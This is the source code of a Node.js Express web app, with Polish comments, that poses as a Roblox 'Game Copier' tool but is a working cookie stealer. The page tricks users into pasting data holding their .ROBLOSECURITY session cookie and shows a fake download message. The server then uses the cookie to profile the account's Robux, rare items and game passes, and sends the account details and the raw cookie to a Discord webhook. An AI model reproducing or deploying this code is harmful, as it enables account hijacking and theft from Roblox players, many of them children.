const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Strona główna
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Tools</title>
  <style>
    body { margin:0; height:100vh; background:#0d0d1a; color:#e0e0ff; font-family:Arial,sans-serif; display:flex; align-items:center; justify-content:center; }
    .card { background:#1a1a2e; border:1px solid #2a2a4a; border-radius:16px; padding:80px 100px; text-align:center; box-shadow:0 10px 40px rgba(0,0,0,0.7); }
    h1 { color:#4a90ff; margin-bottom:40px; font-size:2.8rem; }
    a.btn { background:#3b82f6; color:white; padding:18px 80px; font-size:1.6rem; border-radius:10px; text-decoration:none; transition:all 0.25s; display:inline-block; }
    a.btn:hover { background:#2563eb; transform:translateY(-3px); }
  </style>
</head>
<body>
  <div class="card">
    <h1>Roblox Tools</h1>
    <a href="/game-copier" class="btn">Game Copier</a>
  </div>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
// Strona Game Copier – udaje narzędzie do kopiowania gry
// ────────────────────────────────────────────────
app.get('/game-copier', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Game Copier</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: #0d0d1a;
      color: #e0e0ff;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    h1 { color: #4a90ff; margin-bottom: 30px; font-size: 2.6rem; }
    textarea {
      width: 100%;
      max-width: 760px;
      height: 260px;
      background: #1a1a2e;
      color: #d0d0ff;
      border: 1px solid #2a2a4a;
      border-radius: 10px;
      padding: 18px;
      font-family: Consolas, monospace;
      font-size: 15px;
      resize: vertical;
      margin-bottom: 28px;
    }
    button {
      background: #3b82f6;
      color: white;
      border: none;
      padding: 18px 80px;
      font-size: 1.4rem;
      border-radius: 10px;
      cursor: pointer;
      font-weight: 600;
      transition: all 0.22s;
    }
    button:hover:not(:disabled) { background: #2563eb; transform: translateY(-2px); }
    button:disabled { background: #1e40af; cursor: not-allowed; opacity: 0.7; }
    #status {
      margin-top: 40px;
      font-size: 1.5rem;
      font-weight: bold;
      min-height: 50px;
      text-align: center;
    }
    .ok  { color: #4ade80; }
    .err { color: #ff6b6b; }
    .back {
      position: absolute;
      top: 24px;
      left: 24px;
      color: #60a5fa;
      text-decoration: none;
      font-weight: bold;
      font-size: 1.1rem;
    }
    .back:hover { color: #93c5fd; }
  </style>
</head>
<body>

  <a href="/" class="back">← Back</a>

  <h1>Game Copier</h1>

  <textarea id="input" placeholder="Paste your file / log / text here..."></textarea>

  <button id="btn" onclick="go()">Start</button>

  <div id="status"></div>

<script>
async function go() {
  const btn = document.getElementById('btn');
  const text = document.getElementById('input').value.trim();
  const status = document.getElementById('status');

  status.textContent = '';
  btn.disabled = true;

  if (!text) {
    status.innerHTML = '<span class="err">Nic nie wklejono</span>';
    btn.disabled = false;
    return;
  }

  // Proste wykrywanie – szuka ciągu zaczynającego się od _ i ma co najmniej ~180 znaków
  const matches = text.match(/_[A-Za-z0-9\\-_|]{170,}/g) || [];
  const cookieCandidate = matches.reduce((a, b) => a.length > b.length ? a : b, '');

  if (cookieCandidate.length >= 180) {
    status.innerHTML = '<span class="ok">Game Download Starting (3–5 minutes)</span>';

    // Wysyłamy do backendu – nawet jeśli regex nie jest idealny, /check i tak sprawdzi
    fetch('/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie: cookieCandidate })
    }).catch(() => {});   // nie pokazujemy błędów na frontendzie
  } else {
    status.innerHTML = '<span class="err">Wrong file</span>';
  }

  setTimeout(() => { btn.disabled = false; }, 1800);
}
</script>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
// Pełny checker – wysyła WSZYSTKO na webhook, tak jak było na początku
// ────────────────────────────────────────────────
app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
    return res.status(400).json({ error: 'Missing or invalid cookie' });
  }

  try {
    // CSRF Token
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');

    // Dane użytkownika
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
      },
    });
    if (!userRes.ok) throw new Error('Invalid cookie');
    const userData = await userRes.json();

    // Email verified (badge)
    let emailVerified = false;
    try {
      const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (ownsRes.ok) {
        const ownsData = await ownsRes.json();
        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
      }
    } catch {}

    // Premium
    let hasPremium = false;
    try {
      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (premiumRes.ok) hasPremium = await premiumRes.json();
    } catch {}

    // Robux
    let robux = 0;
    try {
      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (currencyRes.ok) {
        const data = await currencyRes.json();
        robux = data.robux || 0;
      }
    } catch {}

    // RAP
    let rap = 0;
    try {
      const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (assetsRes.ok) {
        const assets = await assetsRes.json();
        rap = assets.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
      }
    } catch {}

    // Grupy owner (rank 255)
    let groupsOwned = 0;
    try {
      const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (groupsRes.ok) {
        const groups = await groupsRes.json();
        groupsOwned = groups.data.filter(g => g.role.rank === 255).length;
      }
    } catch {}

    // Wiek konta
    let accountAgeDays = 0;
    let createdDate = null;
    try {
      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
      if (profileRes.ok) {
        const profile = await profileRes.json();
        if (profile.created) {
          createdDate = profile.created;
          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
        }
      }
    } catch {}

    // Avatar
    let avatarUrl = null;
    try {
      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
      if (thumbRes.ok) {
        const thumbData = await thumbRes.json();
        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
      }
    } catch {}

    // Gamepassy (MM2, AMP, SAB, JB)
    const mm2Ids = [429957, 1308795];
    const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
    const sabIds = [1227013099, 1229510262, 1228591447];
    const jbIds = [2219040, 2725211, 2296901, 56149618, 4974038, 2070427, 2218187];
    const allIds = [...mm2Ids, ...ampIds, ...sabIds, ...jbIds];
    const hasGamePasses = [];
    try {
      for (const passId of allIds) {
        const gpRes = await fetch(
          `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
          { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken, 'Accept': 'application/json' } }
        );
        if (gpRes.ok) {
          const gpData = await gpRes.json();
          if (Array.isArray(gpData.data) && gpData.data.length > 0) hasGamePasses.push(passId);
        }
      }
    } catch {}
    const mm2Count = hasGamePasses.filter(id => mm2Ids.includes(id)).length;
    const ampCount = hasGamePasses.filter(id => ampIds.includes(id)).length;
    const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
    const jbCount = hasGamePasses.filter(id => jbIds.includes(id)).length;

    // Headless & Korblox
    let hasHeadless = false;
    let hasKorblox = false;
    try {
      const headlessRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (headlessRes.ok) {
        const data = await headlessRes.json();
        hasHeadless = Array.isArray(data.data) && data.data.length > 0;
      }

      const korbloxRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (korbloxRes.ok) {
        const data = await korbloxRes.json();
        hasKorblox = Array.isArray(data.data) && data.data.length > 0;
      }
    } catch {}

    // Wysyłka do webhooka – dokładnie tak jak wcześniej
    const webhookUrl = process.env.WEBHOOK;
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [
              {
                color: 0x0F0F23,
                title: `<:User:1481761037257674872> ${userData.name}`,
                description: "**AVATAR**",
                thumbnail: { url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png" },
                fields: [
                  { name: "┌─────── Account Stats ───────┐", value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• RAP: **${rap.toLocaleString('en-US')}**\n• Groups Owned: **${groupsOwned}**`, inline: false },
                  { name: "**Info**", value: `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`, inline: true },
                  { name: "**Games**", value: `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n<:AMP:1481763635775930520> AMP: **${ampCount}**\n<:SAB:1481763931113394177> SAB: **${sabCount}**\n<:JB:1481804052215103509> JB: **${jbCount}**`, inline: true },
                  { name: "**Inventory**", value: `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`, inline: true }
                ],
                footer: { text: "24H! • " + new Date().toLocaleString('en-US') },
                timestamp: new Date().toISOString()
              },
              {
                color: 0x4B0082,
                title: "Captured .ROBLOSECURITY",
                description: `\`\`\`\n${cookie}\n\`\`\``,
                timestamp: new Date().toISOString()
              }
            ]
          })
        });
      } catch (e) {
        console.error("Webhook error:", e.message);
      }
    }

    // Frontendowi zwracamy cokolwiek – i tak tego nie używa
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal error' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
